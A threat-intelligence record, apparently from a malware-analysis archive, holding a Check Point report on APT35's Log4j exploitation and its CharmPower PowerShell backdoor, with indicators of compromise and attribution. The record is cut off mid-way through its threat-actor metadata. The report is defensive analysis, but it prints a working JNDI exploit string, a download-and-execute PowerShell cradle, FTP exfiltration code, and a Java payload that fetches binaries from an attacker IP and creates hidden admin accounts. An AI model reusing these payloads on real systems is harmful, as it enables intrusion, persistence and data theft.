@@ -1,0 +1,281 @@
+{
+    "id": "bd59297d-174a-4c69-81c5-f6907f44cccb",
+    "created_at": "2023-01-12T15:10:29.556822Z",
+    "updated_at": "2025-03-27T02:16:11.674152Z",
+    "deleted_at": null,
+    "sha1_hash": "697ea40c795227d9c405b52cdcc11d18915da57f",
+    "title": "2022-01-11 - APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit",
+    "authors": "",
+    "file_creation_date": "2022-05-28T18:14:35Z",
+    "file_modification_date": "2022-05-28T18:14:35Z",
+    "file_size": 606943,
+    "plain_text": "# APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit\n\n**[research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/](https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/)**\n\nJanuary 11, 2022\n\nJanuary 11, 2022\n\n## Introduction\n\nWith the emergence of the Log4j security vulnerability, we’ve already seen multiple threat\nactors, mostly financially motivated, immediately add it to their exploitation arsenal. It comes\nas no surprise that some nation-sponsored actors also saw this new vulnerability as an\nopportunity to strike before potential targets have identified and patched the affected\nsystems.\n\nAPT35 (aka Charming Kitten, TA453, or Phosphorus), which is suspected to be an Iranian\nnation-state actor, started widespread scanning and attempts to leverage Log4j flaw in\npublicly facing systems only four days after the vulnerability was disclosed. The actor’s\nattack setup was obviously rushed, as they used the basic open-source tool for the\nexploitation and based their operations on previous infrastructure, which made the attack\neasier to detect and attribute.\n\n\n-----\n\nIn this article, we share the details of the latest attacks by APT35 exploiting the Log4j\nvulnerability and analyze their post-exploitation activities including the new modular\nPowerShell-based framework dubbed CharmPower, used to establish persistence, gather\ninformation, and execute commands.\n\n## Infection chain\n\nTo exploit the Log4j vulnerability (CVE-2021-44228), the attackers chose one of the publicly\n[available open-source JNDI Exploit Kits, since removed from GitHub due to its enormous](https://web.archive.org/web/20211210111026/github.com/feihong-cs/JNDIExploit)\n[popularity following the vulnerability emergence. There are multiple analysis papers that](https://research.checkpoint.com/2021/the-laconic-log4shell-faq/)\nexplain how the vulnerability can be exploited, so we will skip the details of the actual\nexploitation step.\n\n_Figure 1: The infection chain._\n\nTo exploit the vulnerable machine, the attackers send a crafted request to the victim’s\npublicly facing resource. In this case, the payload was sent in the User-Agent or HTTP\nAuthorization headers:\n```\n${jndi[:]ldap[://]144[.]217[.]139[.]155:4444/Basic/Command/Base64/cG93ZXJzaGVsbCAtZWMg\n\n```\nAfter successful exploitation, the exploitation server builds and returns a malicious Java\nclass to be executed on a vulnerable machine. This class runs a PowerShell command with\na base64-encoded payload:\n```\nExploitQVQRSQrKet.cmd = \"powershell -ec\nJABXAGUAYgBDAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAG\n\n```\nIt eventually downloads a PowerShell module from an Amazon S3 bucket URL\n```\nhxxps://s3[.]amazonaws[.]com/doclibrarysales/test[.]txt and then executes it:\n$WebClient=New-Object net.webclient\n$Text = $WebClient.downloadString(\"\n<https://s3.amazonaws.com/doclibrarysales/test.txt>\")\npowershell -ec $Text\n\n```\n\n-----\n\n## CharmPower: PowerShell-based modular backdoor\n\nThe downloaded PowerShell payload is the main module responsible for basic\ncommunication with the C&C server and the execution of additional modules received. The\nmain module performs the following operations:\n\n**Validate network connection – Upon execution, the script waits for an active internet**\nconnection by making HTTP POST requests to google.com with the parameter\n```\n   hi=hi .\n\n```\n**Basic system enumeration – The script collects the Windows OS version, computer**\nname, and the contents of a file `Ni.txt in` `$APPDATA path; the file is presumably`\ncreated and filled by different modules that will be downloaded by the main module.\n**Retrieve C&C domain – The malware decodes the C&C domain retrieved from a**\nhardcoded URL `hxxps://s3[.]amazonaws[.]com/doclibrarysales/3 located in`\nthe same S3 bucket from where the backdoor was downloaded.\n**Receive, decrypt, and execute follow-up modules.**\n\nAfter all of the data is gathered, the malware starts communication with the C&C server by\nperiodically sending HTTP POST requests to the following URL on the received domain:\n```\n<C&C domain>/Api/Session .\n\n```\nEach request contains the following POST data:\n```\nSession=\"[OS Version] Enc;;[Computer name]__[Contents of the file at\n$APPDATA\\\\Ni.txt]\"\n\n```\nThe C&C server can respond in one of two ways:\n\nNoComm – No command, which causes the script to keep sending POST requests.\nBase64 string – A module to execute. The module is encrypted with a simple\nsubstitution cipher and encoded in base64. A fragment of the decoding routine is\nprovided below:\n\n\n-----\n\n```\nfunction decrypt($Cipher) {\n  $Cipher = $Cipher.Replace(\"############\", \"+\");\n  $Cipher = $Cipher.Replace(\"************\", \"%\");\n  $Cipher = $Cipher.Replace(\"____________\", \"&\");\n  $Cipher = $Cipher.Replace(\"_c_c_c_c_c_\", \"+\");\n  $Cipher = $Cipher.Replace(\"_x_x_x_x_x_\", \"%\");\n  $Cipher = $Cipher.Replace(\"_z_z_z_z_z_\", \"&\");\n  $b = $Cipher.ToCharArray()\n  [array]::Reverse($b)\n  $ReverseCipher = -join($b)\n  $EncodedText = [char[]]::new($ReverseCipher.length)\n  for ($i = 0; $i -lt $ReverseCipher.length; $i++) {\n    if ($ReverseCipher[$i] - ceq '*') {$EncodedText[$i] = '='} \n  elseif ($ReverseCipher[$i] - ceq 'l') {$EncodedText[$i] = 'a'} \n  elseif ($ReverseCipher[$i] - ceq 'L') {$EncodedText[$i] = 'A'} \n    elseif ($ReverseCipher[$i] - ceq 'c') {$EncodedText[$i] = 'b'} \n    elseif ($ReverseCipher[$i] - ceq 'C') {$EncodedText[$i] = 'B'} \n    <...>\n  }\n  return\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText\n}\n\n```\nThe downloaded modules are either PowerShell scripts, or C# code. Each decoded module\nhas the following format: `language~code~modulename~action, where the action might be`\n```\nstop, start or downloadutil . The latter is relevant only for PowerShell modules.\n\n```\nThe following fragment of the code handles module parsing and performs the relevant\nexecution method depending on the language of the module:\n```\n[string[]]$arr = $CommandPart.Split(\"~\");\n[string]$language = $arr[0];\n[string]$Command = $arr[1];\n[string]$ThreadName = $arr[2];\n[string]$StartStop = $arr[3];\nif ($StartStop -ne \"-\" -and $StartStop -ne \"\") {\n  if ($language -like \"*owers*\") {\n    if ($StartStop -like \"*wnloaduti*\") {\n      &(gcm *ke-e*) $Command;\n    } elseif ($StartStop -eq \"start\") {\n      $scriptBlock = [Scriptblock]::Create($Command)\n      Start-Job -ScriptBlock $scriptBlock -Name $ThreadName\n    } elseif ($StartStop -eq \"stop\") {\n      &(gcm *ke-e*) $Command; }\n  } elseif ($language -like \"*shar*\") {\n    if ($StartStop -eq \"start\") {\n      $ScriptBlock = {Param ([string] [Parameter(Mandatory = $true)] $Command)\n        Add-Type $Command\n        [AppProject.Program]::Main()}\n      Start-Job $ScriptBlock -ArgumentList $Command -Name $ThreadName\n    } elseif ($StartStop -eq \"stop\") {\n      &(gcm *ke-e*) $Command;}\n\n```\n\n-----\n\nThe main module can also change the communication channel: once every 360 C&C loops,\nit can retrieve a new domain from the actors’ S3 bucket:\n```\nif ($loopCount -eq 360) {\n  Write - Output \"-------------------------------------------\"\n  $loopCount = 0\n  $Domain = getDomain\n}\n\n```\nThe modules sent by the C&C are executed by the main module, with each one reporting\ndata back to the server separately. This C&C cycle continues indefinitely, which allows the\nthreat actors to gather data on the infected machine, run arbitrary commands and possibly\nescalate their actions by performing a lateral movement or executing follow-up malware such\nas ransomware.\n\n## Modules\n\nEvery module is auto-generated by the attackers based on the data sent by the main\nmodule: each of the modules contains a hardcoded machine name and a hardcoded C&C\ndomain.\n\nAll the modules we observed contain shared code responsible for:\n\nEncrypting the data.\nExfiltrating gathered data through a POST request or by uploading it to an FTP server.\nSending execution logs to a remote server.\n\nIn addition to this, each module performs some specific job. We managed to retrieve and\nanalyze the next modules:\n\nList installed applications.\nTake screenshots.\nList running processes.\nGet OS and computer information.\nExecute a predefined command from the C&C.\nClean up any traces created by different modules.\n\n### Applications Module\n\nThis module uses two methods to fetch installed applications. The first is to enumerate\n```\nUninstall registry values:\n\n```\n\n-----\n\n```\nfunction Get InstalledPrograms {\n [CmdletBinding()]\n param (\n  [Parameter()]\n  [string]\n  $DisplayName\n )\n Get-ItemProperty -Path @(\n  'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*',\n  'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*',\n  'HKLM:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*',\n  'HKCU:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*'\n ) -ErrorAction SilentlyContinue | Where-Object {\n   -not $PSBoundParameters.ContainsKey('DisplayName') -or (\n   $_.PSObject.Properties.Name -contains 'DisplayName' -and $_.DisplayName -like\n$DisplayName\n  );\n } | Select-Object DisplayName| Sort-Object -Property DisplayName;\n}\n\n```\nThe second method is to use the wmic command:\n```\ncmd.exe /c \"wmic product get name, InstallLocation, InstallDate, Version\n/format:csv > $FilePath\"\n\n### Screenshot Module\n\n```\nWe observed both the C# and PowerShell variants of this module, each of which has the\ncapabilities to capture multiple screenshots with the specified frequency and upload the\nresulted screenshots to the FTP server with credentials hardcoded in the script:\n```\nSendByFTP(\"ftp://\" + \"54.38.49.6\" + \":21/\" + \"VICTIM-PC__\" + \"/screen/\" +\nName + \".jpg\", \"lesnar\", \"[email protected]#\", FilePath);\n\n```\nThe C# script is using a base64-encoded PowerShell command to take a screenshot from\nmultiple screens:\n\n\n-----\n\n```\n[Reflection.Assembly]::LoadWithPartialName( System.Drawing )\n  [void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\") \n  [void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") \n  $width = 0;\n  $height = 0;\n  $workingAreaX = 0;\n  $workingAreaY = 0;\n  $screen = [System.Windows.Forms.Screen]::AllScreens;\n  foreach ($item in $screen) {\n    if($workingAreaX -gt $item.WorkingArea.X) {\n      $workingAreaX = $item.WorkingArea.X;\n    }\n    if($workingAreaY -gt $item.WorkingArea.Y) {\n      $workingAreaY = $item.WorkingArea.Y;\n    }\n    $width = $width + $item.Bounds.Width;\n    if($item.Bounds.Height -gt $height) {\n      $height = $item.Bounds.Height;\n    }\n  }\n  $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width,\n$height); \n  $bmp = New-Object Drawing.Bitmap $width, $height;\n  $graphics = [Drawing.Graphics]::FromImage($bmp);\n  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n  $savePath = \"$env:APPDATA\\\\systemUpdating\\\\help.jpg\";\n  $bmp.Save($savePath);\n\n### Processes Module\n\n```\nThis module attempts to grab running processes by using the tasklist command:\n\n```\ncmd.exe /c \"tasklist /v /FO csv > $FilePath\"\n\n```\n\n### System Information Module\n\nThis module contains a bunch of PowerShell commands, which oddly enough, are\ncommented-out. The only command that is performed is the systeminfo command.\n\n\n-----\n\n```\n#$Path systeminfo \n#$Hosts=$Path|Select-String \"Host Name:\" \n#$OSName=$Path|Select-String \"OS Name:\"\n#$RegisteredOwner=$Path|Select-String \"Registered Owner:\"\n#$SystemBootTime=$Path|Select-String \"System Boot Time:\"\n#$SystemModel=$Path|Select-String \"System Model:\"\n#$SystemType=$Path|Select-String \"System Type:\"\n#$SystemDirectory=$Path|Select-String \"System Directory:\"\n#$TimeZone=$Path|Select-String \"Time Zone:\"\n#$infos=$Hosts.ToString()+\"`r`n\"+$OSName.ToString()+\"`r`n\"+$RegisteredOwner.ToString()\n#$infos | Out-File -FilePath $FilePath\n#Get-Date -Format \"yyyy/dd/MM HH:mm\" | Out-File -FilePath $FilePath -append\n#ipconfig /all | findstr /C:\"IPv4\" /C:\"Physical Address\" >> $FilePath\nsysteminfo | Out-File -FilePath $FilePath -append -Encoding UTF8\n\n```\nFrom the commented-out commands, we can get the idea of how the threat actors organize\nthe system information on their end, what data they are interested in, and what they might\ntake into consideration when sending more modules.\n\n### Command Execution Module\n\nThe threat actors can execute remote commands by running this specialized module with\npredefined actions. This module attempts to execute a command. It uses the PowerShell\n```\nInvoke-Expression method for the PowerShell-based module, while its C#\n\n```\nimplementation has both `cmd and` `PowerShell options.`\n\nDuring the analysis, we observed how the next command execution modules are created\nand sent by the threat actor:\n\nListing the C:/ drive contents using `cd C:/; ls;`\nListing the specific Wi-Fi profile details using `netsh wlan show profiles`\n```\n   name='<Name>' key=clear;\n\n```\nListing the drives using `Get-PSDrive .`\n\n### Cleanup Module\n\nThis module will be dropped after the attackers have finished their activity and want to\nremove any traces from the system. The module contains cleanup methods for persistencerelated artifacts in the registry and startup folder, created files, and running processes.\n\nThis module contains five hardcoded levels, depending on the attack stage, and each one\nserves a different purpose. The execution level is predetermined by the threat actor in each\nspecific case:\n\n\n-----\n\n```\n$Level level4 \nif($Level -eq \"level1\") {\n  wevtutil el\n}\nelseif($Level -eq \"level2\") {\n  CleanStartupFolder\n}\nelseif($Level -eq \"level3\") {\n  CleanPersisRegistryAndFile\n}\nelseif($Level -eq \"level4\") {\n  CleanModules\n}\nelseif($Level -eq \"level5\") {\n  wevtutil el\n  CleanPersisRegistryAndFile\n  CleanStartupFolder\n  Remove-Item $env:APPDATA/a.ps1\n  Remove-Item $env:APPDATA/textmanager.ps1\n  Remove-Item $env:APPDATA/docready.bat\n  Remove-Item $env:APPDATA/pdfreader.bat\n  Remove-ItemProperty -Path\n\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" -Name \"databrowser\"\n}\nCleanupModules function attempts to kill any running processes that are related to\n\n```\npreviously running modules:\n```\nfunction CleanModules {\n  $ProgramFolder = $env:APPDATA + \"/systemUpdating\"\n  $files = Get-ChildItem -Path \"$ProgramFolder\" -Recurse | % { $_.FullName }\n  Foreach ($fileName in $files)   {\n    $lastslash = $fileName.LastIndexOf(\"\\\\\") + 1\n    $PureName = $fileName.Substring($lastslash);\n    taskkill /F /IM \"$PureName\"\n    Remove-Item $ProgramFolder\\\\* -Recurse -Force\n  }\n}\n\n```\nAnother function in the module tries to erase additional indicators that might be used by the\nthreat actor:\n\n\n-----\n\n```\nfunction CleanPersisRegistryAndFile {\n  Remove-ItemProperty -Path \"HKCU:\\\\SOFTWARE\\\\Update\" -Name \"Key\"\n  Remove-ItemProperty -Path \"HKCU:\\\\SOFTWARE\\\\Update2\" -Name \"Key\"\n  Remove-ItemProperty -Path\n\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" -Name \"systemUpdating\"\n  Remove-ItemProperty -Path\n\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" -Name\n\"systemUpdating2\"\n  Remove-ItemProperty -Path\n\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" -Name \"systemUpdating\"\n  Remove-ItemProperty -Path\n\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" -Name \"systemUpdating2\"\n  Remove-Item $env:APPDATA/main.ps1\n  Remove-Item $env:APPDATA/reserve.ps1\n  Remove-Item $env:APPDATA/ni.txt\n}\n\n```\nFrom our examination of this module, it is clear that the threat actors want to keep the\ninfection on the machine for as long as they deem necessary, and once their goal is\nachieved, to be able to disappear without a trace.\n\n## Attribution\n\nUsually, APT actors make sure to change their tools and infrastructure to avoid being\ndetected and make attribution more difficult. APT35, however, does not conform to this\nbehavior. The group is famous in the cybersecurity community for the number of OpSec\n[mistakes in their previous operations, and they tend not to put too much effort into changing](https://www.youtube.com/watch?v=nilzxS9rxEM)\ntheir infrastructure once exposed. It’s no wonder that their operation as described here has\nsignificant overlaps in the code and infrastructure with previous APT35 activities.\n\n### Code Overlaps\n\n[In October 2021, Google Threat Analysis Group published an article about](https://blog.google/threat-analysis-group/countering-threats-iran/) APT35 mobile\nmalware. Even though the samples we analyzed are PowerShell scripts, the similarity of\ncoding style between them and the Android spyware that Google attributed to APT35\nimmediately grabbed our attention.\n\nFirst, the implementation of the logging functions is the same. The Android app uses\nthe following format for logging its operations to the C&C server: `MAC=`\n\n```\n<DEVICE_NAME>&Log=<LOG>&ModuleName=<MODULE_NAME>&Status=<STATUS>\n\n```\n```\npublic static void post_log(String str, String str2, String str3, String str4, String\nstr5) throws MalformedURLException, UnsupportedEncodingException {\n  if (haveNetworkConnection()) {\n    Send_Data_By_Http(Constants.Server_TargetLog, ((((((\"MAC=\" + str) + \n\"&Log=\") + str2) + \"&ModuleName=\") + str3) + \"&Status=\") + str4);\n  }\n}\n\n```\n\n-----\n\nThe PowerShell modules also contain the same logging format, even though the commands\nare commented out and replaced with another format. The fact that these lines were not\nremoved outright might indicate that the change was done only recently.\n```\nfunction Send_Log($Log, $ModuleName, $status)\n{\n  $http_request = New-Object -ComObject Msxml2.XMLHTTP\n  #$parameters = \"MAC=VICTIM-PC\" + \"&Log=\" + $Log + \"&ModuleName=\" + $ModuleName +\n\"&Status=\" + $status   \n  $DataPost = \"VICTIM-PC___;_\" + $ModuleName + \"_;_\" + $Status + \"_;_\" + $Log \n  $DataPostEnc = Encrypt $DataPost\n  $parameters = \"Data=\" + $DataPostEnc\n  $http_request = New-Object -ComObject Msxml2.XMLHTTP\n  $http_request.open(\"POST\", $TargetLog, $false)\n  $http_request.setRequestHeader(\"Content-type\", \"application/x-www-formurlencoded\")\n  $http_request.setRequestHeader(\"Content-length\", $parameters.length)\n  $http_request.send($parameters)\n}\n\n```\nThe syntax of the logging messages is also identical. Here is the Android app code:\n```\nFunctions.post_log(Functions.MAC, \"Successfully Finish Monitor Permissions module.\",\n\"Monitor Permissions\", \"Success\", Constants.Domain);\n\n```\nAnd here is the example of logging code in the scripts:\n```\nSendLog(\"VICTIM-PC__\", \"Successfully Finish Screen module.\", \"Screen\", \"Success\",\nTargetLog);\n\n```\nBoth the mobile and the PowerShell versions use the same unique parameter,\n```\n   Stack=Overflow, in the C&C communication:\n\n```\n_Figure 2: Use of_ `Stack=Overflow parameter in the mobile malware attributed to APT35.`\n\n\n-----\n\n_Figure 3: Use of_ `Stack=Overflow parameter in the PowerShell version.`\n\n### Infrastructure Overlaps\n\nAccording to our analysis of the Android malware of APT35, the C&C server of the mobile\nsample has the following API endpoints:\n```\n/Api/Session\n/Api/GetPublicIp\n/Api/AndroidTargetLog\n/Api/AndroidDownload\n/Api/AndroidBigDownload\n/Api/AndroidHttpModuleData\n/Api/HttpModuleDataAppend\n/Api/IsRunAudioRecorder\n/Api/IsRunClipboard\n/Api/IsRunGPS\n\n```\nThe C&C of the PowerShell malware has the following API endpoints according to the\nmodules we were able to retrieve:\n\n```\n/Api/Session\n\n```\n```\n/Api/TargetLogEnc\n\n```\n```\n/Api/BigDownloadEnc\n\n```\n\nBoth C&C servers for the mobile and PowerShell variants share the API endpoint\n```\n/Api/Sessio n. The other API endpoints are similar but not completely identical due to the\n\n```\ndifferences in the functionality and platform.\n\nEven more interesting, additional tests showed that not only are the URLs similar, but the\nC&C domain of the PowerShell variant actually responds to the API requests that are used in\nthe mobile variant.\n\n\n-----\n\n_Figure 4: The C&C from the PowerShell sample responds to the_ `/Api/GetPublicIp API`\n_request._\n\n_Figure 5: The PowerShell variant C&C response to the_ `/Api/IsRunAudioRecorder API`\n_endpoint._\n\nThe rest of the API endpoints responded with a 405 HTTP error, which is a different\nresponse from a non-existent URL ( /Api/RANDOM_STRING always responds with 404 HTTP\nerror).\n\n_Figure 6: The PowerShell variant C&C response to the_ `/Api/AndroidBigDownload API`\n_endpoint._\n\nOur conclusion here is that the C&C of the PowerShell variant supports the same C&C\ncommunication protocol as the mobile variant. Both C&C servers are running a similar\nserver-side code, and are probably operated by the same threat actor.\n\n## Further hunting\n\nWe analyzed the infrastructure of this attack and made a few observations to complete the\npicture:\n\n\n-----\n\nAll the servers we observed in this campaign are hosted by OVH SAS and Hetzner\n[Online GmbH. This is not the first time APT35 used these hosting providers and,](https://otx.alienvault.com/pulse/5f2a8a6e42fa8609e26f3cff/related)\ncombined with the specific pattern that the C&C domains share( `0<word><letter>`\n```\n   <word>0.xyz ), it provides some leads for further hunting.\n\n```\nWhen we investigated the infrastructure, one of the C&C servers we found responded\nwith modules that use 127.0.0.1 as a C&C server. This is probably a development\nserver, as we didn’t see it in a known infection chain. The number of mistakes made in\nthe code of modules also suggests that the PowerShell-based malware is still under\nactive development.\nThe time it takes the C&C server to respond with a module, and the module type it\nresponds with, differs significantly between victims. It could be evidence for a manual\noperation of the C&C, with the operator deciding which targets are interesting and\nwhich ones are not.\n\n## More exploitation attempts\n\nMultiple activities tracked under the name APT35 include operations that vary significantly in\nscope, targets, and methods. There are clusters of operations that heavily rely on advanced\nspear-phishing techniques for surveillance purposes. On the other side, last year, we saw\nevidence that the actors also entered the ransomware scene. Once again adhering to the\nadage “don’t put all your eggs in one basket”, the day after the described attack began, a\nsubgroup of APT35 launched another large-scale campaign, specifically targeting Israeli\nnetworks. This time, instead of utilizing the open-source Log4j exploitation server, they made\ntheir own implementation of the exploit, but reused the previously exposed infrastructure\ndedicated for ransomware operations.\n\nThe partial code of the malicious Java class, with all the indicators consistent with the\n[analysis by Microsoft &](https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/) [The DFIR Report, shows that the actors seized the opportunity to](https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/)\ncombine several attack stages for both Windows and Linux into a single exploit:\n\n\n-----\n\n```\npublic RCE() {\n  if (File.separator.equals(\"/\")) {\n    this.download(\"<https://148.251.71.182/symantec_linux.x86>\", \"/tmp/lock\");\n    try {\n      Runtime.getRuntime().exec(new String[] { \"/bin/sh\", \"-c\", \"chmod +x\n/tmp/lock ; flock -n /tmp/log.bak /tmp/lock &\" });\n      Runtime.getRuntime().exec(new String[] { \"/bin/sh\", \"-c\", \"(crontab -l &&\necho \\\\\"@reboot flock -n /tmp/log.bak /tmp/lock &\\\\\") | crontab -\" });\n      Runtime.getRuntime().exec(new String[] { \"/bin/sh\", \"-c\", \"sudo useradd g -m -s /bin/bash -p $(echo [email protected] | openssl passwd -1 -stdin) master\" });\n    }\n    catch (IOException iOException) {\n      iOException.printStackTrace();\n    }\n  }\n  else {\n    this.download(\"<https://148.251.71.182/symantec.tmp>\",\n\"c:\\\\\\\\windows\\\\\\\\temp\\\\\\\\dllhost.exe;\");\n    String win_cmd = \"Start-Process c:\\\\\\\\windows\\\\\\\\temp\\\\\\\\dllhost.exe;\";\n    win_cmd += \"net user /add DefaultAccount [email protected]; net user\nDefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup\nAdministrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add\nDefaultAccount; Set-LocalUser -Name DefaultAccount -PasswordNeverExpires 1;\";\n    win_cmd += \"New-Itemproperty -path\n'HKLM:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run' -Name 'DllHost'\n-value 'c:\\\\\\\\windows\\\\\\\\temp\\\\\\\\dllhost.exe' -PropertyType 'String' -Force;\";\n    final String[] arrayOfString = { \"powershell\", \"-c Invoke-Command\", \"{\" +\nwin_cmd + \"}\" };\n    try {\n      Runtime.getRuntime().exec(arrayOfString);\n    }\n    catch (IOException iOException2) {\n      iOException2.printStackTrace();\n    }\n  }\n\n## Conclusion\n\n```\nEvery time there is a new published critical vulnerability, the entire InfoSec community holds\nits breath until its worst fears come true: scenarios of real-world exploitation, especially by\nstate-sponsored actors. As we showed in this article, the wait incase of Log4j vulnerability\nwas only a few days. The combination of its simplicity, and the widespread number of\nvulnerable devices, made this a very attractive vulnerability for actors such as APT35.\n\nIn these attacks, the actors still used the same or similar infrastructure as in many of their\nprevious attacks. However, judging by their ability to take advantage of the Log4j vulnerability\nand by the code pieces of the CharmPower backdoor, the actors are able to change gears\nrapidly and actively develop different implementations for each stage of their attacks.\n\nCheck Point’s [Infinity platform blocks this attack from the very first step.](https://www.checkpoint.com/infinity-vision/)\n\n\n-----\n\n## Indicators of Compromise\n\n144.217.138[.]155\n54.38.49[.]6\n148.251.71[.]182\n0standavalue0[.]xyz\n0storageatools0[.]xyz\n0brandaeyes0[.]xyz\n\n**File Paths:**\n```\n%APPDATA%\\\\Ni.txt\n%APPDATA%\\\\systemUpdating\\\\Applications.txt\n%APPDATA%\\\\systemUpdating\\\\Processes.txt\n%APPDATA%\\\\systemUpdating\\\\Information.txt\n%APPDATA\\\\systemUpdating\\\\help.jpg\n%APPDATA%\\\\systemUpdating\\\\Shell.txt\n%APPDATA%\\\\main.ps1\n%APPDATA%\\\\reserve.ps1\n%APPDATA%\\\\textmanager.ps1\n%APPDATA%\\\\docready.bat\n%APPDATA%\\\\pdfreader.bat\n\n```\n**Registry Keys:**\n```\nPath: HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\nKey: systemUpdating\nPath: HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\nKey: systemUpdating2\nPath: HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\nKey: databrowser\nPath: HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\nKey: systemUpdating\nPath: HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\nKey: systemUpdating2\nPath: HKCU:\\\\SOFTWARE\\\\Update\nKey: Key\nPath: HKCU:\\\\SOFTWARE\\\\Update2\nKey: Key\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-11 - APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit.pdf"
+    ],
+    "report_names": [
+        "2022-01-11 - APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
+            "created_at": "2022-10-25T15:50:23.850506Z",
+            "updated_at": "2025-03-27T02:00:55.501372Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Charming Kitten"
+            ],
+            "source_name": "MITRE:Charming Kitten",
+            "tools": [
+                "DownPaper"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "ae26d287-8ba7-447e-9391-cf13c02d7481",
+            "created_at": "2023-03-04T02:01:54.0962Z",
+            "updated_at": "2025-03-27T02:00:03.120665Z",
+            "deleted_at": null,
+            "main_name": "TA453",
+            "aliases": [],
+            "source_name": "MISPGALAXY:TA453",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
+            "created_at": "2023-01-06T13:46:38.748929Z",
+            "updated_at": "2025-03-27T02:00:02.908256Z",
+            "deleted_at": null,
+            "main_name": "APT35",
+            "aliases": [
+                "Newscaster Team",
+                "Magic Hound",
+                "G0059",
+                "Phosphorus",
+                "Mint Sandstorm",
+                "TunnelVision",
+                "COBALT MIRAGE"
+            ],
+            "source_name": "MISPGALAXY:APT35",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "04888f75-158b-47f9-8ad9-4ff83f618ece",
+            "created_at": "2024-05-01T02:03:08.03763Z",
+            "updated_at": "2025-03-27T02:05:17.319276Z",
+            "deleted_at": null,
+            "main_name": "COBALT MIRAGE",
+            "aliases": [
+                "Nemesis Kitten ",
+                "PHOSPHORUS ",
+                "TunnelVision ",
+                "UNC2448 ",
+                "DEV-0270 "
+            ],
+            "source_name": "Secureworks:COBALT MIRAGE",
+            "tools": [
+                " Custom powershell scripts",
+                " DiskCryptor",
+                " Drokbk",
+                " FRPC",
+                " Fast Reverse Proxy (FRP)",
+                " Impacket wmiexec",
+                " Ngrok",
+                " Plink",
+                " PowerLessCLR",
+                " TunnelFish",
+                "BitLocker"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
+            "created_at": "2023-01-06T13:46:38.364105Z",
+            "updated_at": "2025-03-27T02:00:02.815023Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Parastoo",
+                "iKittens",
+                "Group 83",
+                "NewsBeef",
+                "G0058",
+                "CharmingCypress"
+            ],
+            "source_name": "MISPGALAXY:Charming Kitten",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
+            "created_at": "2024-05-01T02:03:08.027871Z",
+            "updated_at": "2025-03-27T02:05:17.313679Z",
+            "deleted_at": null,
+            "main_name": "COBALT ILLUSION",
+            "aliases": [
+                "APT42 ",
+                "Charming Kitten ",
+                "CharmingCypress ",
+                "ITG18 ",
+                "Magic Hound ",
+                "Mint Sandstorm sub-group ",
+                "NewsBeef ",
+                "Newscaster ",
